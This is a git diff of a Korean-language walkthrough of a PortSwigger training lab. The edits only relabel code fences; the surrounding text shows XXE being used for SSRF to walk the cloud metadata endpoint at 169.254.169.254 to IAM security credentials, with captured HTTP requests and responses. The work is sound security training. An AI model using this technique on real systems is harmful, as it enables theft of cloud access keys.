@@ -46,7 +46,7 @@ In the following XXE example, the external entity will cause the server to make 
 
 버튼 클릭시의 요청을 캡쳐해보면 다음과 같다. POST 바디의 XML을 변조하면 될 것 같다. 
 
-```
+```http
 POST /product/stock HTTP/1.1
 Host: 0a7000f20367b31bc022226200f50064.web-security-academy.net
 Cookie: session=U5aVcT9Ue58F2we2KJukwvF8eZeK6zk1
@@ -87,7 +87,7 @@ Connection: close
 결과 응답은 다음과 같다. latest 가 잘못된 product ID라고 한다. 
 어쨌든 XXE는 가능했고, `http://169.254.169.254/` 에 접근한 결과가 latest 였다고 추측할 수 있다. 
 
-```
+```http
 HTTP/1.1 400 Bad Request
 Content-Type: application/json; charset=utf-8
 Connection: close
@@ -130,7 +130,8 @@ Content-Length: 102
 ```
 
 메세지가 바꼈다. `iam` 이라는 프로덕트 ID를 찾을 수 없다고 한다. 
-```
+
+```http
 HTTP/1.1 400 Bad Request
 Content-Type: application/json; charset=utf-8
 Connection: close
@@ -151,7 +152,8 @@ Content-Length: 25
 ```
 
 그러자 또 응답이 바꼈다. `security-credentials` 라는 프로덕트 ID를 찾을 수 없다고 한다. 아하, 알겠다. 패스(경로)가 맞으면 그 다음패스를 알려주는 것 같다. (그래서 처음 시도에서 `lastest` 가 노출되었던 것 같다. )
-```
+
+```http
 HTTP/1.1 400 Bad Request
 Content-Type: application/json; charset=utf-8
 Connection: close
@@ -173,7 +175,7 @@ Content-Length: 42
 
 `admin` 이라는 프로적트 ID가 없다고 한다. OK, 그러면 admin까지 붙여보자. 
 
-```
+```http
 HTTP/1.1 400 Bad Request
 Content-Type: application/json; charset=utf-8
 Connection: close
@@ -193,7 +195,8 @@ Content-Length: 27
 ```
 
 SSRF로 억세스키 정보를 얻어내는데 성공했다!
-```
+
+```http
 HTTP/1.1 400 Bad Request
 Content-Type: application/json; charset=utf-8
 Connection: close
